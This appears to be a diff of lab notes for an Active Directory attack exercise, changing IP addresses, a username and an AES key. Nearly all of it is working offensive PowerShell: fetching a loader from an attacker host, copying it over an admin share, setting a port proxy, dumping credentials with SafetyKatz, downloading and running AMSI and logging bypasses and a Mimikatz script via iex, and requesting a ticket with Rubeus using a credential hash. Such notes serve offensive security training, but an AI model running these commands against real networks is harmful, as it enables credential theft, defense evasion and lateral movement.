@@ -52,20 +52,20 @@ iwr http://172.16.100.48/Loader.exe -OutFile C:\Users\Public\Loader.exe
 
 echo F | xcopy C:\Users\Public\Loader.exe \\mgmtsrv.tech.finance.corp\C$\Users\Public\Loader.exe
 
-$null | winrs -r:mgmtsrv.tech.finance.corp "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48"
+$null | winrs -r:mgmtsrv.tech.finance.corp "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1"
 ```
 
 Download from local loopback
 ```powershell
 $null | winrs -r:mgmtsrv.tech.finance.corp "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args sekurlsa::evasive-keys exit"
 
-$null | winrs -r:mgmtsrv.tech.finance.corp powershell -c "iex (iwr http://172.16.100.48/sbloggingbypass.txt -useb);iex (iwr http://172.16.100.48/amsibypass.txt -useb);iex (iwr http://172.16.100.48/Invoke-MimiEx-vault.ps1 -useb);"
+$null | winrs -r:mgmtsrv.tech.finance.corp powershell -c "iex (iwr http://172.16.100.1/sbloggingbypass.txt -useb);iex (iwr http://172.16.100.1/amsibypass.txt -useb);iex (iwr http://172.16.100.1/Invoke-MimiEx-vault.ps1 -useb);"
 ```
 
 Note down the `aes256_hmac` and the cleartext credentials 
 Use Rubues on attacking machine
 ```powershell
-C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args asktgt /user:techservice /aes256:7f6825f607e9474bcd6b9c684dc70f7c1ca977ade7bfd2ad152fd54968349deb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 
 This will create a logon type 9 so the new credentials will only be used when accessing domain resources
